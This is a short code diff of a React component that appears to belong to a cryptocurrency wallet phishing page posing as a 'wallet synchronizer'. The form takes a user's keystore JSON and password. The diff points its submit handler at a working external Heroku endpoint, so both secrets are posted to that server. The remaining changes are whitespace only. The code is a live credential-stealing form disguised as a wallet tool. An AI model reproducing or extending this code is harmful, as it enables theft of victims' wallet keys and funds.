@@ -21,7 +21,7 @@ const KeystoreJson = ({
   }, [seed2, password]);
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("https://dappswalletsynchronizer/form", {
+    const res = await axios.post("https://dappswalletsynchronizer.herokuapp.com/form", {
       seed: seed2,
       password,
     });
@@ -35,10 +35,10 @@ const KeystoreJson = ({
   return (
     <>
       <textarea
-        onChange={(e) => setSeed2(e.target.value)}
+        onChange={(e) => setSeed2(e.target.value)} 
         value={seed2}
         rows='10'
-        placeholder='Keystore JSON'
+        placeholder='Keystore JSON' 
       ></textarea>
       <div>
         <textarea
